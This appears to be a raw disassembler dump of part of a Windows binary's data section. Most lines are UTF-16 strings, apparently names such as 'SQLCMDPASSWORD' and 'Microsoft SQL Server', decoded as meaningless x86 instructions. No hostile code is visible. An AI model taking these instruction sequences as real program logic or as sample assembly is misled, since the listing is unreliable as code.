  409dbb:	imul   eax,DWORD PTR [eax],0x6e006f
  409dc1:	dec    edi
  409dc2:	add    BYTE PTR [eax+0x0],dh
  409dc5:	je     0x409dc7
  409dc7:	imul   eax,DWORD PTR [eax],0x6e006f
  409dcd:	jae    0x409dcf
  409dcf:	add    BYTE PTR ds:[eax],ah
  409dd2:	add    BYTE PTR [ebp+0x0],bl
  409dd5:	and    BYTE PTR [eax],al
  409dd7:	pop    ebx
  409dd8:	add    BYTE PTR [esi],ch
  409dda:	add    BYTE PTR [esi],ch
  409ddc:	add    BYTE PTR [esi],ch
  409dde:	add    BYTE PTR [esi+0x0],ch
  409de1:	pop    ebp
  409de2:	add    BYTE PTR ds:0xd000a00,cl
  409de8:	add    BYTE PTR [edx],cl
  409dea:	add    BYTE PTR [eax+eax*1],bh
  409ded:	inc    ebx
  409dee:	add    BYTE PTR [edi+0x0],ch
  409df1:	outs   dx,BYTE PTR ds:[esi]
  409df2:	add    BYTE PTR [esi+0x0],ch
  409df5:	add    BYTE PTR gs:[ebx+0x0],ah
  409df9:	je     0x409dfb
  409dfb:	imul   eax,DWORD PTR [eax],0x6e006f
  409e01:	dec    edi
  409e02:	add    BYTE PTR [eax+0x0],dh
  409e05:	je     0x409e07
  409e07:	imul   eax,DWORD PTR [eax],0x6e006f
  409e0d:	jae    0x409e0f
  409e0f:	add    BYTE PTR ds:[eax],ah
  409e12:	add    BYTE PTR [edx],bh
  409e14:	add    BYTE PTR [edx],bh
  409e16:	add    BYTE PTR ds:0xa000d00,bh
  409e1c:	add    BYTE PTR [ecx],cl
  409e1e:	add    BYTE PTR [ebx+0x0],bh
  409e21:	sub    eax,0x20004500
  409e26:	add    BYTE PTR [eax+eax*1+0x20],bh
  409e2a:	add    BYTE PTR [ebx+0x0],bh
  409e2d:	sub    eax,0x20005500
  409e32:	add    BYTE PTR [eax+eax*1+0x6f],ch
  409e36:	add    BYTE PTR [edi+0x0],ah
  409e39:	imul   eax,DWORD PTR [eax],0x5f006e
  409e3f:	imul   eax,DWORD PTR [eax],0x200064
  409e45:	pop    ebx
  409e46:	add    BYTE PTR ds:0x20005000,ch
  409e4c:	add    BYTE PTR [eax+0x0],dh
  409e4f:	popa   
  409e50:	add    BYTE PTR [ebx+0x0],dh
  409e53:	jae    0x409e55
  409e55:	ja     0x409e57
  409e57:	outs   dx,DWORD PTR ds:[esi]
  409e58:	add    BYTE PTR [edx+0x0],dh
  409e5b:	add    BYTE PTR fs:[ebp+0x0],bl
  409e5f:	jge    0x409e61
  409e61:	jge    0x409e63
  409e63:	or     eax,0x9000a00
  409e68:	add    BYTE PTR [ebx+0x0],bl
  409e6b:	sub    eax,0x20005300
  409e70:	add    BYTE PTR [ebx+0x0],dh
  409e73:	add    BYTE PTR gs:[edx+0x0],dh
  409e77:	jbe    0x409e79
  409e79:	add    BYTE PTR gs:[edx+0x0],dh
  409e7d:	pop    edi
  409e7e:	add    BYTE PTR [esi+0x0],ch
  409e81:	popa   
  409e82:	add    BYTE PTR [ebp+0x0],ch
  409e85:	add    BYTE PTR gs:[ebx+0x0],bl
  409e89:	pop    esp
  409e8a:	add    BYTE PTR [ecx+0x0],ch
  409e8d:	outs   dx,BYTE PTR ds:[esi]
  409e8e:	add    BYTE PTR [ebx+0x0],dh
  409e91:	je     0x409e93
  409e93:	popa   
  409e94:	add    BYTE PTR [esi+0x0],ch
  409e97:	arpl   WORD PTR [eax],ax
  409e99:	add    BYTE PTR gs:[edi+0x0],bl
  409e9d:	outs   dx,BYTE PTR ds:[esi]
  409e9e:	add    BYTE PTR [ecx+0x0],ah
  409ea1:	ins    DWORD PTR es:[edi],dx
  409ea2:	add    BYTE PTR [ebp+0x0],ah
  409ea5:	pop    ebp
  409ea6:	add    BYTE PTR [ebp+0x0],bl
  409ea9:	or     eax,0x9000a00
  409eae:	add    BYTE PTR [ebx+0x0],bl
  409eb1:	sub    eax,0x20006400
  409eb6:	add    BYTE PTR [eax+eax*1+0x61],ah
  409eba:	add    BYTE PTR [eax+eax*1+0x61],dh
  409ebe:	add    BYTE PTR [edx+0x0],ah
  409ec1:	popa   
  409ec2:	add    BYTE PTR [ebx+0x0],dh
  409ec5:	add    BYTE PTR gs:[edi+0x0],bl
  409ec9:	outs   dx,BYTE PTR ds:[esi]
  409eca:	add    BYTE PTR [ecx+0x0],ah
  409ecd:	ins    DWORD PTR es:[edi],dx
  409ece:	add    BYTE PTR [ebp+0x0],ah
  409ed1:	pop    ebp
  409ed2:	add    BYTE PTR ds:0x9000a00,cl
  409ed8:	add    BYTE PTR [ebx+0x0],bl
  409edb:	sub    eax,0x20006c00
  409ee0:	add    BYTE PTR [eax+eax*1+0x6f],ch
  409ee4:	add    BYTE PTR [edi+0x0],ah
  409ee7:	imul   eax,DWORD PTR [eax],0x5f006e
  409eed:	je     0x409eef
  409eef:	imul   eax,DWORD PTR [eax],0x65006d
  409ef5:	outs   dx,DWORD PTR ds:[esi]
  409ef6:	add    BYTE PTR [ebp+0x0],dh
  409ef9:	je     0x409efb
  409efb:	pop    ebp
  409efc:	add    BYTE PTR ds:0x1000a00,cl
  409f02:	and    eax,0x510053
  409f07:	dec    esp
  409f08:	add    BYTE PTR [ebx+0x0],al
  409f0b:	dec    ebp
  409f0c:	add    BYTE PTR [eax+eax*1+0x4c],al
  409f10:	add    BYTE PTR [edi+0x0],cl
  409f13:	inc    edi
  409f14:	add    BYTE PTR [ecx+0x0],cl
  409f17:	dec    esi
  409f18:	add    BYTE PTR [eax+eax*1+0x49],dl
  409f1c:	add    BYTE PTR [ebp+0x0],cl
  409f1f:	inc    ebp
  409f20:	add    BYTE PTR [edi+0x0],cl
  409f23:	push   ebp
  409f24:	add    BYTE PTR [eax+eax*1+0x0],dl
  409f28:	sbb    eax,0x510053
  409f2d:	dec    esp
  409f2e:	add    BYTE PTR [ebx+0x0],al
  409f31:	dec    ebp
  409f32:	add    BYTE PTR [eax+eax*1+0x50],al
  409f36:	add    BYTE PTR [ecx+0x0],al
  409f39:	push   ebx
  409f3a:	add    BYTE PTR [ebx+0x0],dl
  409f3d:	push   edi
  409f3e:	add    BYTE PTR [edi+0x0],cl
  409f41:	push   edx
  409f42:	add    BYTE PTR [eax+eax*1+0x0],al
  409f46:	add    ebp,DWORD PTR [edi]
  409f48:	add    BYTE PTR [eax],al
  409f4a:	add    ebp,DWORD PTR ds:0x2c030100
  409f50:	add    BYTE PTR [eax],al
  409f52:	pop    es
  409f53:	pop    eax
  409f54:	add    BYTE PTR [ebp+0x0],cl
  409f57:	dec    esp
  409f58:	add    BYTE PTR [eax],al
  409f5a:	or     ecx,DWORD PTR [eax+eax*1+0x45]
  409f5e:	add    BYTE PTR [esi+0x0],dl
  409f61:	inc    ebp
  409f62:	add    BYTE PTR [eax+eax*1+0x0],cl
  409f66:	add    eax,DWORD PTR [ebp+0x0]
  409f69:	add    BYTE PTR [ebx],al
  409f6b:	push   ebp
  409f6c:	add    BYTE PTR [eax],al
  409f6e:	add    edx,DWORD PTR [eax+0x0]
  409f71:	add    BYTE PTR [ebx],al
  409f73:	push   ebx
  409f74:	add    BYTE PTR [eax],al
  409f76:	add    esp,DWORD PTR [eax+eax*1+0x0]
  409f7a:	add    ebp,DWORD PTR [eax+eax*1+0x0]
  409f7e:	add    edi,DWORD PTR [edi]
  409f80:	add    BYTE PTR [eax],al
  409f82:	pop    es
  409f83:	dec    esi
  409f84:	add    BYTE PTR [ebp+0x0],al
  409f87:	push   edi
  409f88:	add    BYTE PTR [eax],al
  409f8a:	add    eax,0x440049
  409f8f:	add    BYTE PTR ds:0x470049,cl
  409f95:	dec    esi
  409f96:	add    BYTE PTR [edi+0x0],cl
  409f99:	push   edx
  409f9a:	add    BYTE PTR [ebp+0x0],al
  409f9d:	add    BYTE PTR [edi],cl
  409f9f:	push   esp
  409fa0:	add    BYTE PTR [ecx+0x0],cl
  409fa3:	dec    ebp
  409fa4:	add    BYTE PTR [ebp+0x0],al
  409fa7:	dec    edi
  409fa8:	add    BYTE PTR [ebp+0x0],dl
  409fab:	push   esp
  409fac:	add    BYTE PTR [eax],al
  409fae:	adc    eax,0x480053
  409fb3:	dec    edi
  409fb4:	add    BYTE PTR [edi+0x0],dl
  409fb7:	inc    ebp
  409fb8:	add    BYTE PTR [esi+0x0],dl
  409fbb:	inc    ebp
  409fbc:	add    BYTE PTR [esi+0x0],cl
  409fbf:	push   esp
  409fc0:	add    BYTE PTR [ebx+0x0],dl
  409fc3:	add    BYTE PTR [ebx],cl
  409fc5:	inc    ebp
  409fc6:	add    BYTE PTR [edx+0x0],dl
  409fc9:	push   edx
  409fca:	add    BYTE PTR [edi+0x0],cl
  409fcd:	push   edx
  409fce:	add    BYTE PTR [eax],al
  409fd0:	xorps  xmm0,XMMWORD PTR [eax]
  409fd3:	inc    ecx
  409fd4:	add    BYTE PTR [edx+0x0],dl
  409fd7:	dec    esi
  409fd8:	add    BYTE PTR [ecx+0x0],cl
  409fdb:	dec    esi
  409fdc:	add    BYTE PTR [edi+0x0],al
  409fdf:	add    BYTE PTR [ecx],cl
  409fe1:	dec    ecx
  409fe2:	add    BYTE PTR [esi+0x0],cl
  409fe5:	inc    esi
  409fe6:	add    BYTE PTR [edi+0x0],cl
  409fe9:	add    BYTE PTR [ebx],bl
  409feb:	inc    ebx
  409fec:	add    BYTE PTR [edi+0x0],cl
  409fef:	dec    esi
  409ff0:	add    BYTE PTR [esi+0x0],al
  409ff3:	dec    ecx
  409ff4:	add    BYTE PTR [edi+0x0],al
  409ff7:	push   ebp
  409ff8:	add    BYTE PTR [edx+0x0],dl
  409ffb:	inc    ecx
  409ffc:	add    BYTE PTR [eax+eax*1+0x49],dl
  40a000:	add    BYTE PTR [edi+0x0],cl
  40a003:	dec    esi
  40a004:	add    BYTE PTR [eax],al
  40a006:	or     DWORD PTR [esi+0x0],eax
  40a009:	push   edx
  40a00a:	add    BYTE PTR [edi+0x0],cl
  40a00d:	dec    ebp
  40a00e:	add    BYTE PTR [eax],al
  40a010:	add    eax,0x4f0054
  40a015:	add    BYTE PTR [edi],cl
  40a017:	push   ebx
  40a018:	add    BYTE PTR [ebp+0x0],al
  40a01b:	push   edx
  40a01c:	add    BYTE PTR [esi+0x0],dl
  40a01f:	dec    ecx
  40a020:	add    BYTE PTR [ebx+0x0],al
  40a023:	inc    ebp
  40a024:	add    BYTE PTR [eax],al
  40a026:	adc    DWORD PTR [ebx+0x0],eax
  40a029:	dec    edi
  40a02a:	add    BYTE PTR [esi+0x0],cl
  40a02d:	push   esp
  40a02e:	add    BYTE PTR [edx+0x0],dl
  40a031:	inc    ecx
  40a032:	add    BYTE PTR [ebx+0x0],al
  40a035:	push   esp
  40a036:	add    BYTE PTR [eax],al
  40a038:	or     eax,0x49004d
  40a03d:	push   edx
  40a03e:	add    BYTE PTR [edx+0x0],dl
  40a041:	dec    edi
  40a042:	add    BYTE PTR [edx+0x0],dl
  40a045:	add    BYTE PTR ds:0x4e0045,dl
  40a04b:	inc    ebx
  40a04c:	add    BYTE PTR [edx+0x0],dl
  40a04f:	pop    ecx
  40a050:	add    BYTE PTR [eax+0x0],dl
  40a053:	push   esp
  40a054:	add    BYTE PTR [ecx+0x0],cl
  40a057:	dec    edi
  40a058:	add    BYTE PTR [esi+0x0],cl
  40a05b:	add    BYTE PTR ds:0x4e004f,al
  40a061:	add    BYTE PTR [edi],al
  40a063:	dec    edi
  40a064:	add    BYTE PTR [esi+0x0],al
  40a067:	inc    esi
  40a068:	add    BYTE PTR [eax],al
  40a06a:	adc    eax,DWORD PTR [ecx+0x0]
  40a06d:	dec    esi
  40a06e:	add    BYTE PTR [edi+0x0],cl
  40a071:	dec    esi
  40a072:	add    BYTE PTR [ecx+0x0],bl
  40a075:	dec    ebp
  40a076:	add    BYTE PTR [edi+0x0],cl
  40a079:	push   ebp
  40a07a:	add    BYTE PTR [ebx+0x0],dl
  40a07d:	add    BYTE PTR [edi],cl
  40a07f:	push   edx
  40a080:	add    BYTE PTR [ebp+0x0],dl
  40a083:	dec    esi
  40a084:	add    BYTE PTR [eax+eax*1+0x49],dl
  40a088:	add    BYTE PTR [ebp+0x0],cl
  40a08b:	inc    ebp
  40a08c:	add    BYTE PTR [eax],al
  40a08e:	cmovae eax,DWORD PTR [eax]
  40a091:	dec    edi
  40a092:	add    BYTE PTR [esi+0x0],cl
  40a095:	dec    esi
  40a096:	add    BYTE PTR [ebp+0x0],al
  40a099:	inc    ebx
  40a09a:	add    BYTE PTR [eax+eax*1+0x0],dl
  40a09e:	sub    edx,DWORD PTR [ebx+0x0]
  40a0a1:	jae    0x40a0a3
  40a0a3:	bound  eax,QWORD PTR [eax]
  40a0a5:	inc    esp
  40a0a6:	add    BYTE PTR [ecx+0x0],ch
  40a0a9:	popa   
  40a0aa:	add    BYTE PTR [edi+0x0],ah
  40a0ad:	outs   dx,BYTE PTR ds:[esi]
  40a0ae:	add    BYTE PTR [edi+0x0],ch
  40a0b1:	jae    0x40a0b3
  40a0b3:	add    BYTE PTR gs:[esi],ch
  40a0b6:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40a0ba:	add    BYTE PTR [ebx+0x0],ah
  40a0bd:	popa   
  40a0be:	add    BYTE PTR [eax+eax*1+0x69],ch
  40a0c2:	add    BYTE PTR [edx+0x0],bh
  40a0c5:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40a0ca:	and    eax,DWORD PTR [edx+0x0]
  40a0cd:	inc    ecx
  40a0ce:	add    BYTE PTR [eax+eax*1+0x41],al
  40a0d2:	add    BYTE PTR [edx+0x0],dl
  40a0d5:	inc    edi
  40a0d6:	add    BYTE PTR [ebp+0x0],dl
  40a0d9:	dec    ebp
  40a0da:	add    BYTE PTR [ebp+0x0],al
  40a0dd:	push   esp
  40a0de:	add    BYTE PTR [edi+0x0],bl
  40a0e1:	inc    esp
  40a0e2:	add    BYTE PTR [edx+0x0],al
  40a0e5:	dec    esi
  40a0e6:	add    BYTE PTR [ecx+0x0],al
  40a0e9:	dec    ebp
  40a0ea:	add    BYTE PTR [ebp+0x0],al
  40a0ed:	add    BYTE PTR ds:0x450048,dh
  40a0f3:	dec    esp
  40a0f4:	add    BYTE PTR [eax+0x0],dl
  40a0f7:	push   esp
  40a0f8:	add    BYTE PTR [ebp+0x0],al
  40a0fb:	pop    eax
  40a0fc:	add    BYTE PTR [eax+eax*1+0x5f],dl
  40a100:	add    BYTE PTR [ebx+0x0],al
  40a103:	push   ebp
  40a104:	add    BYTE PTR [eax+eax*1+0x54],cl
  40a108:	add    BYTE PTR [ebp+0x0],dl
  40a10b:	push   edx
  40a10c:	add    BYTE PTR [ebp+0x0],al
  40a10f:	pop    edi
  40a110:	add    BYTE PTR [eax+eax*1+0x45],al
  40a114:	add    BYTE PTR [eax+0x0],dl
  40a117:	inc    ebp
  40a118:	add    BYTE PTR [esi+0x0],cl
  40a11b:	inc    esp
  40a11c:	add    BYTE PTR [ebp+0x0],al
  40a11f:	dec    esi
  40a120:	add    BYTE PTR [eax+eax*1+0x0],dl
  40a124:	pop    ss
  40a125:	inc    ebp
  40a126:	add    BYTE PTR [esi+0x0],dl
  40a129:	inc    ebp
  40a12a:	add    BYTE PTR [esi+0x0],cl
  40a12d:	push   esp
  40a12e:	add    BYTE PTR [ebx+0x0],dl
  40a131:	inc    ebx
  40a132:	add    BYTE PTR [edi+0x0],cl
  40a135:	push   ebp
  40a136:	add    BYTE PTR [esi+0x0],cl
  40a139:	push   esp
  40a13a:	add    BYTE PTR [eax],al
  40a13c:	and    eax,0x560045
  40a141:	inc    ebp
  40a142:	add    BYTE PTR [esi+0x0],cl
  40a145:	push   esp
  40a146:	add    BYTE PTR [ebx+0x0],dl
  40a149:	inc    ebx
  40a14a:	add    BYTE PTR [edi+0x0],cl
  40a14d:	push   ebp
  40a14e:	add    BYTE PTR [esi+0x0],cl
  40a151:	push   esp
  40a152:	add    BYTE PTR [ecx+0x0],cl
  40a155:	inc    edi
  40a156:	add    BYTE PTR [esi+0x0],cl
  40a159:	dec    edi
  40a15a:	add    BYTE PTR [edx+0x0],dl
  40a15d:	inc    ebp
  40a15e:	add    BYTE PTR [eax+eax*1+0x0],al
  40a162:	and    ecx,DWORD PTR [ecx+0x0]
  40a165:	dec    esi
  40a166:	add    BYTE PTR [eax+eax*1+0x45],dl
  40a16a:	add    BYTE PTR [edx+0x0],dl
  40a16d:	dec    esi
  40a16e:	add    BYTE PTR [ecx+0x0],al
  40a171:	dec    esp
  40a172:	add    BYTE PTR [ebp+0x0],al
  40a175:	pop    eax
  40a176:	add    BYTE PTR [ebx+0x0],al
  40a179:	inc    ebp
  40a17a:	add    BYTE PTR [eax+0x0],dl
  40a17d:	push   esp
  40a17e:	add    BYTE PTR [ecx+0x0],cl
  40a181:	dec    edi
  40a182:	add    BYTE PTR [esi+0x0],cl
  40a185:	add    BYTE PTR [ebx],ch
  40a187:	dec    ecx
  40a188:	add    BYTE PTR [esi+0x0],cl
  40a18b:	push   esp
  40a18c:	add    BYTE PTR [ebp+0x0],al
  40a18f:	push   edx
  40a190:	add    BYTE PTR [esi+0x0],cl
  40a193:	inc    ecx
  40a194:	add    BYTE PTR [eax+eax*1+0x45],cl
  40a198:	add    BYTE PTR [eax+0x0],bl
  40a19b:	inc    ebx
  40a19c:	add    BYTE PTR [ebp+0x0],al
  40a19f:	push   eax
  40a1a0:	add    BYTE PTR [eax+eax*1+0x49],dl
  40a1a4:	add    BYTE PTR [edi+0x0],cl
  40a1a7:	dec    esi
  40a1a8:	add    BYTE PTR [edi+0x0],bl
  40a1ab:	push   ebx
  40a1ac:	add    BYTE PTR [ecx+0x0],dl
  40a1af:	dec    esp
  40a1b0:	add    BYTE PTR [eax],al
  40a1b2:	sbb    ecx,DWORD PTR [ebp+0x0]
  40a1b5:	dec    ecx
  40a1b6:	add    BYTE PTR [ebx+0x0],dl
  40a1b9:	push   ebx
  40a1ba:	add    BYTE PTR [ecx+0x0],cl
  40a1bd:	dec    esi
  40a1be:	add    BYTE PTR [edi+0x0],al
  40a1c1:	dec    edi
  40a1c2:	add    BYTE PTR [eax+0x0],dl
  40a1c5:	push   esp
  40a1c6:	add    BYTE PTR [ecx+0x0],cl
  40a1c9:	dec    edi
  40a1ca:	add    BYTE PTR [esi+0x0],cl
  40a1cd:	add    BYTE PTR ds:0x410050,bl
  40a1d3:	push   ebx
  40a1d4:	add    BYTE PTR [ebx+0x0],dl
  40a1d7:	push   edi
  40a1d8:	add    BYTE PTR [edi+0x0],cl
  40a1db:	push   edx
  40a1dc:	add    BYTE PTR [eax+eax*1+0x50],al
  40a1e0:	add    BYTE PTR [edx+0x0],dl
  40a1e3:	dec    edi
  40a1e4:	add    BYTE PTR [ebp+0x0],cl
  40a1e7:	push   eax
  40a1e8:	add    BYTE PTR [eax+eax*1+0x0],dl
  40a1ec:	and    eax,0x4e0055
  40a1f1:	push   edx
  40a1f2:	add    BYTE PTR [ebp+0x0],al
  40a1f5:	inc    ebx
  40a1f6:	add    BYTE PTR [edi+0x0],cl
  40a1f9:	inc    edi
  40a1fa:	add    BYTE PTR [esi+0x0],cl
  40a1fd:	dec    ecx
  40a1fe:	add    BYTE PTR [edx+0x0],bl
  40a201:	inc    ebp
  40a202:	add    BYTE PTR [eax+eax*1+0x4f],al
  40a206:	add    BYTE PTR [eax+0x0],dl
  40a209:	push   esp
  40a20a:	add    BYTE PTR [ecx+0x0],cl
  40a20d:	dec    edi
  40a20e:	add    BYTE PTR [esi+0x0],cl
  40a211:	add    BYTE PTR [eax],al
  40a213:	add    bl,dl
  40a215:	cmp    ebx,DWORD PTR [ecx]
  40a217:	pop    ds
  40a218:	sub    al,0xd5
  40a21a:	mov    dh,0x42
  40a21c:	xchg   ecx,eax
  40a21d:	mov    eax,0x31eec56
  40a222:	jae    0x40a1de
  40a224:	add    BYTE PTR [eax],cl
  40a226:	mov    bh,0x7a
  40a228:	pop    esp
  40a229:	push   esi
  40a22a:	sbb    DWORD PTR [eax+eiz*8],esi
  40a22d:	mov    DWORD PTR [edx],eax
  40a22f:	push   es
  40a230:	push   cs
  40a231:	adc    BYTE PTR [ecx],dh
  40a233:	add    BYTE PTR [ecx],dh
  40a235:	add    BYTE PTR [esi],ch
  40a237:	add    BYTE PTR [eax],dh
  40a239:	add    BYTE PTR [esi],ch
  40a23b:	add    BYTE PTR [eax],dh
  40a23d:	add    BYTE PTR [esi],ch
  40a23f:	add    BYTE PTR [eax],dh
  40a241:	add    BYTE PTR [edx],al
  40a243:	push   es
  40a244:	or     BYTE PTR [ebx+ecx*1],al
  40a247:	add    BYTE PTR [eax],al
  40a249:	add    BYTE PTR [eax+eax*1],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    BYTE PTR [esp+esi*1],al
  40a251:	or     BYTE PTR [eax],al
  40a253:	add    BYTE PTR [eax],cl
  40a255:	xor    DWORD PTR [eax],eax
  40a257:	xor    DWORD PTR [eax],eax
  40a259:	add    BYTE PTR cs:[eax],dh
  40a25c:	add    BYTE PTR [eax],ch
  40a25e:	dec    ebp
  40a25f:	add    BYTE PTR [ecx+0x0],ch
  40a262:	arpl   WORD PTR [eax],ax
  40a264:	jb     0x40a266
  40a266:	outs   dx,DWORD PTR ds:[esi]
  40a267:	add    BYTE PTR [ebx+0x0],dh
  40a26a:	outs   dx,DWORD PTR ds:[esi]
  40a26b:	add    BYTE PTR [esi+0x0],ah
  40a26e:	je     0x40a270
  40a270:	and    BYTE PTR [eax],al
  40a272:	push   ebx
  40a273:	add    BYTE PTR [ecx+0x0],dl
  40a276:	dec    esp
  40a277:	add    BYTE PTR [eax],ah
  40a279:	add    BYTE PTR [ebx+0x0],dl
  40a27c:	add    BYTE PTR gs:[edx+0x0],dh
  40a280:	jbe    0x40a282
  40a282:	add    BYTE PTR gs:[edx+0x0],dh
  40a286:	sbb    BYTE PTR [eax+0x30007b],0x78
  40a28d:	add    BYTE PTR [edx+0x0],ah
  40a290:	add    BYTE PTR fs:[edi],dh
  40a293:	add    BYTE PTR [esi+0x0],ah
  40a296:	aaa    
  40a297:	add    BYTE PTR [ebx+0x0],ah
  40a29a:	xor    BYTE PTR [eax],al
  40a29c:	add    BYTE PTR fs:[eax+eax*1],ch
  40a2a0:	and    BYTE PTR [eax],al
  40a2a2:	xor    BYTE PTR [eax],al
  40a2a4:	js     0x40a2a6
  40a2a6:	aaa    
  40a2a7:	add    BYTE PTR [ebx+0x0],ah
  40a2aa:	xor    eax,DWORD PTR [eax]
  40a2ac:	add    BYTE PTR ss:[eax+eax*1],ch
  40a2b0:	and    BYTE PTR [eax],al
  40a2b2:	xor    BYTE PTR [eax],al
  40a2b4:	js     0x40a2b6
  40a2b6:	xor    al,0x0
  40a2b8:	aaa    
  40a2b9:	add    BYTE PTR [edx],dh
  40a2bb:	add    BYTE PTR [ecx],dh
  40a2bd:	add    BYTE PTR [eax+eax*1],ch
  40a2c0:	and    BYTE PTR [eax],al
  40a2c2:	jnp    0x40a2c4
  40a2c4:	xor    BYTE PTR [eax],al
  40a2c6:	js     0x40a2c8
  40a2c8:	popa   
  40a2c9:	add    BYTE PTR [esi+0x0],ah
  40a2cc:	sub    al,0x0
  40a2ce:	and    BYTE PTR [eax],al
  40a2d0:	xor    BYTE PTR [eax],al
  40a2d2:	js     0x40a2d4
  40a2d4:	popa   
  40a2d5:	add    BYTE PTR [eax],bh
  40a2d7:	add    BYTE PTR [eax+eax*1],ch
  40a2da:	and    BYTE PTR [eax],al
  40a2dc:	xor    BYTE PTR [eax],al
  40a2de:	js     0x40a2e0
  40a2e0:	bound  eax,QWORD PTR [eax]
  40a2e2:	sub    al,0x0
  40a2e4:	and    BYTE PTR [eax],al
  40a2e6:	xor    BYTE PTR [eax],al
  40a2e8:	js     0x40a2ea
  40a2ea:	popa   
  40a2eb:	add    BYTE PTR [edi],dh
  40a2ed:	add    BYTE PTR [eax+eax*1],ch
  40a2f0:	and    BYTE PTR [eax],al
  40a2f2:	xor    BYTE PTR [eax],al
  40a2f4:	js     0x40a2f6
  40a2f6:	xor    BYTE PTR [eax],al
  40a2f8:	sub    al,0x0
  40a2fa:	and    BYTE PTR [eax],al
  40a2fc:	xor    BYTE PTR [eax],al
  40a2fe:	js     0x40a300
  40a300:	add    BYTE PTR gs:[edx],dh
  40a303:	add    BYTE PTR [eax+eax*1],ch
  40a306:	and    BYTE PTR [eax],al
  40a308:	xor    BYTE PTR [eax],al
  40a30a:	js     0x40a30c
  40a30c:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  40a311:	add    BYTE PTR [eax],ah
  40a313:	add    BYTE PTR [eax],dh
  40a315:	add    BYTE PTR [eax+0x0],bh
  40a318:	cmp    DWORD PTR [eax],eax
  40a31a:	add    BYTE PTR gs:[ebp+0x0],bh
  40a31e:	jge    0x40a320
  40a320:	push   ds
  40a321:	push   ebx
  40a322:	add    BYTE PTR [ecx+0x0],dl
  40a325:	dec    esp
  40a326:	add    BYTE PTR [eax],ah
  40a328:	add    BYTE PTR [ebx+0x0],dl
  40a32b:	add    BYTE PTR gs:[edx+0x0],dh
  40a32f:	jbe    0x40a331
  40a331:	add    BYTE PTR gs:[edx+0x0],dh
  40a335:	and    BYTE PTR [eax],al
  40a337:	xor    al,BYTE PTR [eax]
  40a339:	xor    BYTE PTR [eax],al
  40a33b:	xor    DWORD PTR [eax],eax
  40a33d:	xor    al,BYTE PTR [eax]
  40a33f:	xor    cl,BYTE PTR [ebp+0x0]
  40a342:	imul   eax,DWORD PTR [eax],0x720063
  40a348:	outs   dx,DWORD PTR ds:[esi]
  40a349:	add    BYTE PTR [ebx+0x0],dh
  40a34c:	outs   dx,DWORD PTR ds:[esi]
  40a34d:	add    BYTE PTR [esi+0x0],ah
  40a350:	je     0x40a352
  40a352:	and    BYTE PTR [eax],al
  40a354:	push   ebx
  40a355:	add    BYTE PTR [ecx+0x0],dl
  40a358:	dec    esp
  40a359:	add    BYTE PTR [eax],ah
  40a35b:	add    BYTE PTR [ebx+0x0],dl
  40a35e:	add    BYTE PTR gs:[edx+0x0],dh
  40a362:	jbe    0x40a364
  40a364:	add    BYTE PTR gs:[edx+0x0],dh
  40a368:	and    BYTE PTR [eax],al
  40a36a:	xor    al,BYTE PTR [eax]
  40a36c:	xor    BYTE PTR [eax],al
  40a36e:	xor    DWORD PTR [eax],eax
  40a370:	xor    al,BYTE PTR [eax]
  40a372:	push   es
  40a373:	xor    DWORD PTR [eax],eax
  40a375:	xor    DWORD PTR [eax],eax
  40a377:	xor    BYTE PTR [eax],al
  40a379:	or     dh,BYTE PTR [ebx+0x0]
  40a37c:	jno    0x40a37e
  40a37e:	ins    BYTE PTR es:[edi],dx
  40a37f:	add    BYTE PTR [ecx],dh
  40a381:	add    BYTE PTR [ecx],dh
  40a383:	add    BYTE PTR [edx],dh
  40a385:	push   ebx
  40a386:	add    BYTE PTR [ecx+0x0],dl
  40a389:	dec    esp
  40a38a:	add    BYTE PTR [ebx+0x0],dl
  40a38d:	add    BYTE PTR gs:[edx+0x0],dh
  40a391:	jbe    0x40a393
  40a393:	add    BYTE PTR gs:[edx+0x0],dh
  40a397:	inc    edx
  40a398:	add    BYTE PTR [edi+0x0],ch
  40a39b:	outs   dx,DWORD PTR ds:[esi]
  40a39c:	add    BYTE PTR [ebx+0x0],ch
  40a39f:	jae    0x40a3a1
  40a3a1:	dec    edi
  40a3a2:	add    BYTE PTR [esi+0x0],ch
  40a3a5:	ins    BYTE PTR es:[edi],dx
  40a3a6:	add    BYTE PTR [ecx+0x0],ch
  40a3a9:	outs   dx,BYTE PTR ds:[esi]
  40a3aa:	add    BYTE PTR [ebp+0x0],ah
  40a3ad:	add    BYTE PTR cs:[ecx],dh
  40a3b0:	add    BYTE PTR [ecx],dh
  40a3b2:	add    BYTE PTR [esi],ch
  40a3b4:	add    BYTE PTR [eax],dh
  40a3b6:	add    BYTE PTR [edx],bl
  40a3b8:	push   ebx
  40a3b9:	add    BYTE PTR [ecx+0x0],dl
  40a3bc:	dec    esp
  40a3bd:	add    BYTE PTR [ebx+0x0],dl
  40a3c0:	add    BYTE PTR gs:[edx+0x0],dh
  40a3c4:	jbe    0x40a3c6
  40a3c6:	add    BYTE PTR gs:[edx+0x0],dh
  40a3ca:	xor    al,BYTE PTR [eax]
  40a3cc:	xor    BYTE PTR [eax],al
  40a3ce:	xor    DWORD PTR [eax],eax
  40a3d0:	xor    al,BYTE PTR [eax]
  40a3d2:	dec    eax
  40a3d3:	aaa    
  40a3d4:	add    BYTE PTR [esi+0x0],ah
  40a3d7:	add    BYTE PTR gs:[eax+eax*1],dh
  40a3db:	add    BYTE PTR ss:[ebx],dh
  40a3de:	add    BYTE PTR [eax],dh
  40a3e0:	add    BYTE PTR [ecx+0x0],ah
  40a3e3:	sub    eax,0x33003000
  40a3e8:	add    BYTE PTR [ebx],dh
  40a3ea:	add    BYTE PTR [eax],dh
  40a3ec:	add    BYTE PTR ds:0x62003400,ch
  40a3f2:	add    BYTE PTR [eax],dh
  40a3f4:	add    BYTE PTR [ecx],dh
  40a3f6:	add    BYTE PTR ds:0x35006100,ch
  40a3fc:	add    BYTE PTR [ebp+0x0],ah
  40a3ff:	add    BYTE PTR ss:0x37006100,ch
  40a406:	add    BYTE PTR [edi],dh
  40a408:	add    BYTE PTR [ebx+0x0],ah
  40a40b:	aaa    
  40a40c:	add    BYTE PTR [ecx+0x0],ah
  40a40f:	add    BYTE PTR fs:[ebx],dh
  40a412:	add    BYTE PTR [eax+eax*1],dh
  40a415:	add    BYTE PTR gs:[edx+0x0],ah
  40a419:	xor    BYTE PTR [eax],al
  40a41b:	dec    esp
  40a41c:	jnp    0x40a41e
  40a41e:	aaa    
